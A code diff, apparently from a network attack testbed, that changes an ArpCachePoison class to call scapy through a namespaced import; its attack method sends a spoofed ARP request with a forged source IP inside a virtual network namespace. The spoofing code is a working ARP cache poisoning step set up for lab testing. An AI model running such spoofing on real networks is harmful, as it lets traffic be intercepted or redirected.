@@ -2,6 +2,7 @@ from lib.connectivity import *
 from attacks.attack import Attack
 from pyroute2 import IPRoute
 import netns
+import scapy.all as scapy
 
 class ArpCachePoison(Attack):
 
@@ -18,7 +19,7 @@ class ArpCachePoison(Attack):
 
     def attack(self) -> None:
         with netns.NetNS(nsname='host2'):
-            sendp( Ether(dst=self.interfaces[1].mac)/ARP(op='who-has', psrc=self.interfaces[0].ip, pdst=self.interfaces[1].ip))
+            scapy.sendp( scapy.Ether(dst=self.interfaces[1].mac)/scapy.ARP(op='who-has', psrc=self.interfaces[0].ip, pdst=self.interfaces[1].ip))
 
     def result(self) -> bool:
         with netns.NetNS(nsname='host1'):
